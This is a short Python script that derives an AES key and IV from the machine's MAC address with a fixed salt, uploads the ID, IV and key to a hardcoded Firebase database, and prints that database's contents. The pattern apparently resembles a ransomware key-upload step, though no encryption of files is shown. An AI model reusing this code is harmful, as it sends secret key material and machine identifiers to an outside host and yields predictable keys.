import crypto
import sys
sys.modules['Crypto'] = crypto
from firebase import firebase
import os.path
import hashlib
from uuid import getnode as get_mac

SALT_SIZE = 16  # This size is arbitrary
IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits

password = 'hwanlee'
password = password.encode()

mac = get_mac()
password = str(mac)
password = password.encode()

salt = os.urandom(SALT_SIZE)
testsalt = b'0912'
base = hashlib.pbkdf2_hmac('sha256', password, testsalt, 100000, dklen=IV_SIZE + KEY_SIZE)
iv = base[0:IV_SIZE]
key = base[IV_SIZE:]

firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)

result = firebase.post('/user',{'ID':str(password),'IV':str(iv),'KEY':str(key)})

result2 = firebase.get('/user',None)
print(result2)